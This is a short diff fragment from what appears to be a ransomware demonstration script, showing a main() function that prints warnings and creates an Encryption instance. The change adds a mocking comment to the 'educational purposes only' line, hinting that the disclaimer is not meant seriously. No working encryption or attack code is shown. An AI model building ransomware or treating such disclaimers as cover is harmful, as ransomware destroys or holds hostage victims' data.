@@ -152,7 +152,7 @@ WARNING: This is a demonstration. Do not pay any ransom.
 def main():
     print("WARNING: This isnt fully tested ran in sandboxed environment .")
     print("Do not run this on any system with important files.")
-    print("This code is for educational purposes only lol..")
+    print("This code is for educational purposes only lol.. ")#definatelyyyyyyyyyyyyyyyyyy hehehe
     
     # Create enc instance
     enc = Encryption()
